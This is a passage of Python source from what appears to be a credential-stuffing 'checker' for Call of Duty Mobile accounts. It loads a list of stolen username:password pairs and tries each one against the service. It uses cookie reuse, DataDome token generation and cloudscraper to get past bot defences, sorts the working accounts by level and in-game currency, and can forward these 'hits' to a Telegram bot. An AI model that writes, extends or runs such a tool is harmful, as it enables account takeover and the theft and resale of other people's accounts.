        display_banner()
        filename, AUTO_REMOVE_CHECKED = select_input_file_flow(show_auto_remove=True)
        if not filename or not os.path.exists(filename):
            console.print(f"   [red]❌ File not found.[/]")
            return
        result_folder = "Results"
        os.makedirs(result_folder, exist_ok=True)
        cookie_manager = CookieManager()
        datadome_manager = DataDomeManager()
        live_stats = LiveStats()
        session = cloudscraper.create_scraper()
        valid_cookies = cookie_manager.get_valid_cookies()
        cookie_count = len(valid_cookies)
        if valid_cookies:
            combined_cookie_str = "; ".join(valid_cookies)
            console.print(f"   [green][🍪] You have [{cookie_count}] unique cookies on your file[/]")
            applyck(session, combined_cookie_str)
            final_cookie_value = valid_cookies[-1]
            datadome_value = final_cookie_value.split('=', 1)[1].strip() if '=' in final_cookie_value and len(final_cookie_value.split('=', 1)) > 1 else None
            if datadome_value:
                datadome_manager.set_datadome(datadome_value)
        else:
            console.print(f"   [yellow]⚠️  No saved cookies. Generating fresh session...[/]")
            datadome = get_datadome_cookie(session)
            if datadome:
                datadome_manager.set_datadome(datadome)
                console.print(f"   [green]✅ Generated DataDome cookie[/]")
        accounts = []
        encodings_to_try = ['utf-8', 'latin-1', 'cp1252', 'iso-8859-1']
        for encoding in encodings_to_try:
            try:
                with open(filename, 'r', encoding=encoding) as file:
                    accounts = [line.strip() for line in file if line.strip() and not line.startswith('===')]
                break
            except UnicodeDecodeError:
                continue
            except Exception:
                continue
        if not accounts:
            console.print(f"   [red]❌ No valid accounts found[/]")
            return
        live_stats.set_total(len(accounts))
        console.print(f"   [cyan][🧑‍💻] Processing [{len(accounts)}] accounts to check...[/]\n")
        tg_choice = rich_confirm("Enable Telegram hit sender?")
        if tg_choice:
            TG_SETTINGS = {}
            TG_SETTINGS["bot_token"] = Prompt.ask("[bold yellow]Enter BOT_TOKEN[/bold yellow]")
            TG_SETTINGS["chat_id"] = Prompt.ask("[bold yellow]Enter CHAT_ID[/bold yellow]")
            clean_only = rich_confirm("Send only CLEAN accounts?")
            TG_SETTINGS["clean_only"] = clean_only
            console.print("[bold cyan]Select Level Range to Send Hits:[/bold cyan]")
            console.print("[1] 1-50\n[2] 51-100\n[3] 101-150\n[4] 151-200\n[5] 201-250\n[6] 251-300\n[7] 301-350\n[8] 351-400\n[9] ALL LEVELS")
            range_choice = Prompt.ask("[bold yellow]Enter number[/bold yellow]", choices=["1","2","3","4","5","6","7","8","9"])
            ranges = {
                "1": "1-50", "2": "51-100", "3": "101-150", "4": "151-200",
                "5": "201-250", "6": "251-300", "7": "301-350", "8": "351-400", "9": "ALL"
            }
            TG_SETTINGS["level_range"] = ranges.get(range_choice, "ALL")
            console.print("[green]Telegram hit sender enabled.[/green]")
        else:
            TG_SETTINGS = None
        console.print(f"   [cyan]{'─' * 75}[/]\n")
        def ui_log(msg, color):
            console.print(f"   [{color}]{msg}[/]")
        for i, account_line in enumerate(accounts, 1):
            if shutdown_event.is_set():
                break
            if ':' not in account_line:
                continue
            try:
                account, password = account_line.split(':', 1)
                account = account.strip()
                password = password.strip()
                ui_log(f"[{i}/{len(accounts)}] Checking account: {account}:{password}", "blue")
                result = processaccount(session, account, password, cookie_manager, datadome_manager, live_stats, result_folder, ui_log=ui_log)
                if "\n" not in result:
                    console.print(f"   {result}")
                else:
                    console.print(result)
                console.print(f"   [dim]-----------------------------------------------------------[/]")
                s = live_stats.get_stats()
                s['high_shell'] = live_stats.highest_shells
                s['high_lvl'] = live_stats.highest_level
                s['high_clean'] = live_stats.highest_clean
                console.print(build_live_stats_ui(s))
                if AUTO_REMOVE_CHECKED:
                    try:
                        with open(filename, "r", encoding="utf-8", errors="ignore") as f:
                            remain = [ln for ln in f if ln.strip() != account_line.strip()]
                        with open(filename, "w", encoding="utf-8") as f:
                            for r in remain:
                                f.write(r if r.endswith("\n") else r + "\n")
                    except Exception:
                        pass
            except Exception as e:
                continue
        end_time = datetime.now()
        start_time = datetime.fromtimestamp(live_stats.start_time) if hasattr(live_stats, 'start_time') else datetime.now()
        stats = live_stats.get_stats()
        stats['high_shell'] = live_stats.highest_shells
        stats['high_lvl'] = live_stats.highest_level
        stats['high_clean'] = live_stats.highest_clean
        if live_stats.valid_hits:
            sorted_desc = sorted(live_stats.valid_hits, key=lambda x: x['level'], reverse=True)
            with open(os.path.join(result_folder, 'HIGH TO LOW.txt'), 'w', encoding='utf-8') as f:
                for hit in sorted_desc:
                    f.write(hit['text'] + "\n ________________________ \n\n")
            sorted_asc = sorted(live_stats.valid_hits, key=lambda x: x['level'])
            with open(os.path.join(result_folder, 'LOW TO HIGH.txt'), 'w', encoding='utf-8') as f:
                for hit in sorted_asc:
                    f.write(hit['text'] + "\n ________________________ \n\n")
        display_aesthetic_summary(stats, start_time, end_time, live_stats.top_accounts, live_stats.countries)
        display_thank_you()
        console.print(f"\n   [cyan]ᴛʜᴀɴᴋ ʏᴏᴜ ғᴏʀ ᴜsɪɴɢ ʀɪᴇʟ ᴄᴏᴅᴍ ᴄʜᴇᴄᴋᴇʀ—sᴇᴇ ᴜ![/]\n")
        console.print("[yellow]Press Enter to exit...[/yellow]")
    except KeyboardInterrupt:
        shutdown_event.set()
        console.print("\n[bold red]⚠ INTERRUPTED BY USER - Shutting down gracefully...[/]")
        console.print("[yellow]Partial results have been saved.[/]")
        try:
            end_time = datetime.now()
            start_time = datetime.fromtimestamp(live_stats.start_time) if hasattr(live_stats, 'start_time') else datetime.now()
            stats = live_stats.get_stats()
            stats['high_shell'] = live_stats.highest_shells
            stats['high_lvl'] = live_stats.highest_level
            stats['high_clean'] = live_stats.highest_clean
            display_aesthetic_summary(stats, start_time, end_time, live_stats.top_accounts, live_stats.countries)
            display_thank_you()
        except:
            pass
        console.print("[green]Exiting...[/green]")
        sys.exit(0)

if __name__ == "__main__":
    main()